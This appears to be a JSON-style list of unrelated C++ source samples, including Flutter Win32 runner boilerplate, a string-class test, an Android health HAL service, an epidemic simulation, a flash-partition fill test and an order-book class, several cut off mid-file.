std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n    s1.insert(sinsert2, 17);\n    std::cout << \"-> Insert \\\"\" << sinsert2 << \"\\\" at pos 17 \" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl; \n\n\n    // TEST DELETE function\n    // s1 should be \"Strings like ABCD are **~very~** epic.\" at this point\n    std::cout << \"\\n[Testing dlt()]\" << std::endl;\n    std::cout << \"s1: \" << s1  << std::endl; \n    s1.dlt(8, 10);\n    std::cout << \"-> Delete 10 chars starting at pos 8\" << std::endl;     \n    std::cout << \"s1: \" << s1  << std::endl; \n\n\n    // TEST REPLACE function\n    std::cout << \"\\n[Testing replace()]\" << std::endl;\n    string s4 = string(\"abc\");\n    string srep1 = string('y');\n    string srep2 = string(\"z\");\n    string srep3 = string(\"123\");\n\n    std::cout << \"s4: \" << s4 << std::endl; \n    s4.replace('x', 0);\n    std::cout << \"-> Replace with 'x' at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep1, 1);\n    std::cout << \"-> Replace with string '\" << srep1 << \"' at pos 1 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep2, 2);\n    std::cout << \"-> Replace with string \\\"\" << srep2 << \"\\\" at pos 2 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n    s4.replace(srep3, 0);\n    std::cout << \"-> Replace with string \\\"\" << srep3 << \"\\\" at pos 0 \" << std::endl;\n    std::cout << \"s4: \" << s4 << std::endl;\n\n\n    // TEST COUNT function\n    std::cout << \"\\n[Testing count()]\" << std::endl;\n    std::cout << \"s1: \" << s1 << std::endl;\n    std::cout << \"'a' in s1: \" << s1.count('a') << std::endl;\n   ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    string str=\"Hello World\";\r\n    int arr[str.size()];\r\n    string final_arr[str.size()];\r\n    // Conversion of Each Char of String to Binary\r\n    for(int i=0;i<str.size();i++)\r\n    {\r\n        int temp;\r\n        string final,temp1;\r\n        temp=str[i];\r\n        while(temp>0)\r\n        {\r\n            int var;\r\n            var=temp%2;\r\n            temp1=to_string(var);\r\n            final.append(temp1);\r\n            temp=temp/2;\r\n        }\r\n        final_arr[i]=final;\r\n    }\r\n    cout<<\"--------------------------------------------------\"<<endl;\r\n    // Reversing each string in  the array of string\r\n    for(int i=0;i<str.size();i++)\r\n    {\r\n        string t=final_arr[i];\r\n        reverse(t.begin(),t.end());\r\n        final_arr[i]=t;\r\n        cout<<final_arr[i]<<endl;\r\n    }\r\n    cout<<\"---------------------------------------------------\"<<endl;\r\n    // Converting each string of array final_arr to integer and putting it into arr\r\n    for(int i=0;i<str.size();i++)\r\n    {\r\n        int t;\r\n        t=stoi(final_arr[i]);\r\n        arr[i]=t;\r\n        cout<<arr[i]<<endl;\r\n    }\r\n    cout<<\"---------------------------------------------------\"<<endl;\r\n    //Applying Bitwise AND operations on the integers of array arr\r\n    for(int i=0;i<str.size();i++)\r\n    {\r\n        cout<<\"Apllication of AND on each Char of the string: \"<<endl;\r\n        int sol=str[i]&127;\r\n        cout<<sol<<endl;\r\n    }cout<<\"---------------------------------------------------\"<<endl;\r\n    //Applying Bitwise XOR operations on the integers of array arr\r\n    for(int i=0;i<str.size();i++)\r\n    {\r\n        cout<<\"Apllication of XOR on each Char of the string: \"<<endl;\r\n        int sol=str[i]^127;\r\n        cout<<sol<<endl;\r\n    }\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animdo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright (C) 2021 The Android Open Source Project\n * Copyright (C) 2022 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <android-base/logging.h>\n#include <android/binder_interface_utils.h>\n#include <health-impl/Health.h>\n#include <health/utils.h>\n\n#ifndef CHARGER_FORCE_NO_UI\n#define CHARGER_FORCE_NO_UI 0\n#endif\n\n#if !CHARGER_FORCE_NO_UI\n#include <health-impl/ChargerUtils.h>\n#endif\n\nusing aidl::android::hardware::health::HalHealthLoop;\nusing aidl::android::hardware::health::Health;\n\n#if !CHARGER_FORCE_NO_UI\nusing aidl::android::hardware::health::charger::ChargerCallback;\nusing aidl::android::hardware::health::charger::ChargerModeMain;\n#endif\n\nstatic constexpr const char* gInstanceName = \"default\";\nstatic constexpr std::string_view gChargerArg{\"--charger\"};\n\n#if !CHARGER_FORCE_NO_UI\nnamespace aidl::android::hardware::health {\nclass ChargerCallbackImpl : public ChargerCallback {\npublic:\n    using ChargerCallback::ChargerCallback;\n    bool ChargerEnableSuspend() override { return true; }\n};\n} // namespace aidl::android::hardware::health\n#endif\n\nint main(int argc, char** argv) {\n#ifdef __ANDROID_RECOVERY__\n    android::base::InitLogging(argv, android::base::KernelLogger);\n#endif\n\n    // make a default health service\n    auto config = std::make_unique<healthd_config>();\n    ::android::hardware::health::InitHealthdConfig(config.get());\n    auto binder = ndk::SharedRefBase::make<Health>(gInstanceName, std::move(config));\n\n    if (argc >= 2 && argv[1] == gChargerArg) {\n#if !CHARGER_FORCE_NO_UI\n        // If charger shouldn't have UI for your device, simply drop the line below\n        // for your service implementation. This corresponds to\n        // ro.charger.no_ui=true\n        return ChargerModeMain(binder, std::make_shared<aidl::android::hardware::health::ChargerCallbackImpl>(binder));\n#endif\n\n        LOG(INFO) << \"Starting charger mode without UI.\";\n    } else {\n        LOG(INFO) << \"Starting health HAL.\";\n    }\n\n    auto hal_health_loop = std::make_shared<HalHealthLoop>(binder, binder);\n    return hal_health_loop->StartLoop();\n}\n",
    "/****************************************Copyright (c)*************************************************\n**                      \t\tEast China Normal University\n**                               http://www.ecnu.edu.cn/\n**--------------File Info------------------------------------------------------------------------------\n** File name:           cal_value.cpp\n** Created by:          linzhaohua\n** Created date:        2020-1-3\n** Version:             V1.0\n** Descriptions:        Simplex_NonMarkovian_QMF\uff0c\u4e00\u9636\u6dec\u706b\u5e73\u5747\u573a\u7406\u8bba\uff0c\u753brhoParm\u56fe\uff0c\u8fed\u4ee3\u5f0f\u7b97\u6cd5\n********************************************************************************************************/\n#include \"../headers/config.h\"\n\nFPARM g_Fun;\nint g_taskNum;\n\nstatic void Set_Fun_Parm(void);\nstatic void Set_Network_Parm(void);\nstatic double Gamma_Fun(double x);\nstatic void Cal_SteadyRho_Of_Diff_Rho0_And_Diff_Parm(void);\n/********************************************************************************************************************************\n** Function name:       Draw_SteadyRho_Of_Parm_Diagram\n** Descriptions:        Draw_SteadyRho_Of_Parm_Diagram\n** input parameters:    None\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Draw_SteadyRho_Of_Parm_Diagram(void)\n{\n\tSet_Fun_Parm();\n\tSet_Network_Parm();\n\tCal_SteadyRho_Of_Diff_Rho0_And_Diff_Parm();\n}\n/********************************************************************************************************************************\n** Function name:       Set_Fun_Parm\n** Descriptions:        \u521d\u59cb\u5316g_Fun\n** input parameters:    None\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Set_Fun_Parm(void)\n{\n\tdouble aveRec_Rate = 0.5;\n\n#ifdef PARM_INF_2D\n\tg_Fun.BETA_INF_1D = 2.3;\n\tg_Fun.ALPHA_INF_1D = 2.0;\t\t\t\t\t\t\t//1D\t//or 0.5, 1.0, 2.0, 4.0\t\t//0.5 + double(g_taskNum) * 0.5;\n\tg_Fun.ALPHA_INF_2D = 0.5 + double(g_taskNum) * 0.5;\t//2D\n#elif defined PARM_INF_1D\n\tg_Fun.BETA_INF_2D = 1.425815;\t\t\t\t\t\t \t//2D\t\t\n\t//infect\n\tif (g_taskNum == 0)\n\t{\n\t\tg_Fun.ALPHA_INF_1D = 1.0;\t\t\t\t\t\t\t//1D\t//or 0.5, 1.0, 2.0, 4.0\t\t//0.5 + double(g_taskNum) * 0.5;\n\t}\n\telse if (g_taskNum == 1)\n\t{\n\t\tg_Fun.ALPHA_INF_1D = 5.0;\n\t}\n\telse if (g_taskNum == 2)\n\t{\n\t\tg_Fun.ALPHA_INF_1D = 10.0;\n\t}\t\t\n\tg_Fun.ALPHA_INF_2D = 15.0;\t//2D\n#endif\n\tg_Fun.ALPHA_REC = 15.0;\t\t\t\t\t\t\t\t//recovery\n\tg_Fun.BETA_REC = 1.0 / (Gamma_Fun(1.0 + 1.0 / g_Fun.ALPHA_REC)*aveRec_Rate);\t//to keep the same aveRec_Rate between the markovian and the non-markovian processes.\n\n\n\tg_Fun.REAL_TIME_LEN = 80;\n\tg_Fun.UPDATE_STEP_LEN = 0.01;\n\n\tclock_t startTime = clock();\n\tCal_Effective_Rate_And_Output_Into_File();\n\tclock_t endTime = clock();\n\n\tcout << \"run time: \" << (double)(endTime - startTime) / CLOCKS_PER_SEC << \"s\"\n\t\t<< \"(\" << (double)(endTime - startTime) / (CLOCKS_PER_SEC * 60) << \"min)\"\n\t\t<< \"(\" << (double)(endTime - startTime) / (CLOCKS_PER_SEC * 60 * 60) << \"h)\" << endl;\n\n\tOutput_Fun_Parm();\n}\n\n/********************************************************************************************************************************\n** Function name:       Gamma_Fun\n** Descriptions:        \u8ba1\u7b97gamma\u51fd\u6570\u7684\u51fd\u6570\u503c\uff08\u5b9e\u6570\u57df\uff0cx>0\uff09\n** input parameters:    x(is x of gamma(x))\n** output parameters:   gamma(x)\n** Returned value:      gamma(x)\n********************************************************************************************************************************/\ndouble Gamma_Fun(double x)\n{\n\tdouble sol = 0.0;\n\tdouble dt = 0.00001;\n\tdouble tMax = 500.0;\n\n\tif (x - 1.0 >= 0.0)\n\t{\n\t\tsol += pow(0.0, x - 1.0)*exp(-0.0)*dt;\n\t}\n\tfor (double t = dt; t <= tMax; t += dt)\n\t{\n\t\tsol += pow(t, x - 1.0)*exp(-t)*dt;\n\t}\n\n\treturn sol;\n}\n/********************************************************************************************************************************\n** Function name:       Set_Network_Parm\n** Descriptions:        Set_Network_Parm\n** input parameters:    None\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Set_Network_Parm(void)\n{\n#ifdef ER_NETWORK\n\tg_Net.SERIAL = 1;\n\tg_Net.N = 1000;\n\tg_Net.P = 0.006;\n\n#elif defined WS_NETWORK\n\tg_Net.SERIAL = 2;\n\tg_Net.N = 1000;\n\tg_Net.HALF_DEGREE = 6;\n\tg_Net.P = 1;\n\n#elif defined BA_NETWORK\n\tg_Net.SERIAL = 3;\n\tg_Net.N = 100;\n\tg_Net.M0 = 4;\n\tg_Net.M = 3;\n\n#elif defined COMPLETE_NETWORK\n\tg_Net.SERIAL = 4;\n\tg_Net.N = 100;\n\n#elif defined UCM_NETWORK\n\tg_Net.SERIAL = 5;\n\tg_Net.N = 1000;\n\tg_Net.KMIN = 15;\n\tg_Net.KMAX = 31;\n\tg_Net.GAMMA = 3.0;  //range limit: gamma > 0\n\n#elif defined REGULAR_RANDOM_NETWORK\n\tg_Net.SERIAL = 6;\n\tg_Net.N = 5000;\n\tg_Net.DEGREE = 20;\n\n#elif defined REGULAR_NETWORK\n\tg_Net.SERIAL = 7;\n\tg_Net.N = 100;\n\tg_Net.DEGREE = 10;\n#elif defined RSC_NETWORK\n\tg_Net.SERIAL = 9;\n\tg_Net.N",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecommerce_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2024 Arista Networks, Inc.  All rights reserved.\n// Arista Networks, Inc. Confidential and Proprietary.\n\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <thread>\n#include <cstdint>\n#include <mutex>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <sys/ioctl.h>\n#include <sys/statvfs.h>\n\n#ifndef __USE_GNU\n#define __USE_GNU\n#endif\n\nstd::mutex mtx; // Mutex for synchronized output\n\nbool createFileToFillPartition(const std::string& filePath) {\n    // Open a file at the specified path for writing\n    std::ofstream outfile(filePath, std::ios::binary);\n    if (!outfile.is_open()) {\n        std::cerr << \"Error: Unable to open file for writing\" << std::endl;\n        return false;\n    }\n\n    struct statvfs stat;\n    if (statvfs(\"/mnt/flash\", &stat) != 0) {\n        std::cerr << \"Error: Unable to get filesystem statistics\" << std::endl;\n        outfile.close();\n        return false;\n    }\n    unsigned long long totalSize = stat.f_blocks * stat.f_frsize; // Total size in bytes\n    unsigned long long ninetyPercent = (9 * totalSize) / 10; // 90% of total size\n    unsigned long long freeSpace = stat.f_bfree * stat.f_frsize; // Free space in bytes\n    std::cout << \"totalSize: \" << totalSize << \" ninetyPercent: \" << ninetyPercent << std::endl;\n    unsigned long long bytesWritten = totalSize - freeSpace;\n    std::cout << \"freeSpace: \" << freeSpace << \" Initial bytesWritten: \" << bytesWritten << std::endl;\n    const char data[] = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\";\n    while (bytesWritten < ninetyPercent) {\n        unsigned long long remainingBytes = ninetyPercent - bytesWritten;\n        unsigned long long writeSize = sizeof(data) - 1; // Exclude null terminator\n        if (writeSize > remainingBytes) {\n            writeSize = remainingBytes;\n        }\n        outfile.write(data, writeSize);\n        if (!outfile) {\n            std::cerr << \"Error: Write operation failed\" << std::endl;\n            outfile.close();\n            return false;\n        }\n        bytesWritten += writeSize;\n        /*\n         *std::cout << \"bytesWritten: \" << bytesWritten<< std::endl;\n         */\n    }\n\n    // Close the file\n    outfile.close();\n\n    std::cout << \"File created and filled up to 90% of partition size successfully\" << std::endl;\n    return true;\n}\n\nint main() {\n    std::string filePath = \"/mnt/flash/FillData\";\n    if (createFileToFillPartition(filePath)) {\n        std::cout << \"SSD filled at least 90%\" << std::endl;\n    } else {\n        std::cerr << \"Could not fill SSD\" << std::endl;\n    }\n    return 0;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expense_tracker\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"libary.h\"\n\nenum class OrderType\n{\n\tGoodTillCancel,  // holds till user says no and cancels the damn order\n\tFillandKill // completely execute the entire order immediately (fill) or cancel the entire order (kill) if it cannot be filled immediately. (have time constrains)\n};\n\nenum class Side\n{\n\tBuy,\n\tSell\n};\n\n\nusing Price = std::int32_t;\nusing Quantity = std::uint32_t;\nusing OrderID = std::uint64_t; // string here?\n\nstruct LevelInfo\n{\n\tPrice price_;\n\tQuantity quantity_;\n};\n\nusing LevelInfos = std::vector<LevelInfo>;\n\nclass OrderbookLevelInfos\n{\npublic:\n\tOrderbookLevelInfos(const LevelInfos& bids, const LevelInfos& asks)\n\t\t: bids_{ bids }\n\t\t, asks_{ asks }\n\t{ }\n\n\tconst LevelInfos& GetBids() const { return bids_; }\n\tconst LevelInfos& GetAsks() const { return asks_; }\n\nprivate:\n\tLevelInfos bids_;\n\tLevelInfos asks_;\n};\n\nclass Order\n{\npublic:\n    Order(OrderType orderType, OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderType_{ orderType }, orderID_{ orderID }, side_{ side },\n        price_{ price }, initialQuantity_{ quantity }, remainingQuantity_{ quantity } {}\n\n    OrderType GetOrderType() const { return orderType_; }\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetInitialQuantity() const { return initialQuantity_; }\n    Quantity GetRemainingQuantity() const { return remainingQuantity_; }\n    Quantity GetFilledQuantity() const { return GetInitialQuantity() - GetRemainingQuantity(); }\n    bool isFilled() const { return  GetRemainingQuantity() == false;  }\n    void Fill(Quantity quantity)\n    {\n        if (quantity > GetRemainingQuantity())\n        {\n            std::ostringstream oss;\n            oss << \"Order (\" << GetOrderID() << \") cannot be filled for more than its remainder quantity.\";\n            throw std::logic_error(oss.str());\n        }\n\n        remainingQuantity_ -= quantity;\n    }\n\nprivate:\n    OrderType orderType_;\n    OrderID orderID_;\n    Side side_;\n    Price price_;\n    Quantity initialQuantity_;\n    Quantity remainingQuantity_;\n};\n\nusing OrderPointer = std::shared_ptr<Order>;\nusing OrderPointers = std::list<OrderPointer>;\n\nclass OrderModify\n{\npublic 